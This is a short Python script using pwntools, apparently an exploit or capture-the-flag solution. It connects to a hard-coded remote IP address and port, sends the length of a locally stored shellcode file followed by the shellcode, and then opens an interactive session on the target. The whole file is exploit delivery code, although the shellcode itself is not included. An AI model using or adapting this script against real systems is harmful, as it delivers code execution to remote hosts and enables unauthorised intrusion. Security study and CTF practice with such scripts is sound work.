from pwn import *
import struct

REMOTE_IP = "158.178.197.18"
REMOTE_PORT = 39909

p = remote(REMOTE_IP, REMOTE_PORT)

with open("./shellcode", "rb") as f:
    shellcode = f.read()

p.send(struct.pack('!H', len(shellcode)))

p.sendline(shellcode)

p.clean()

p.interactive()
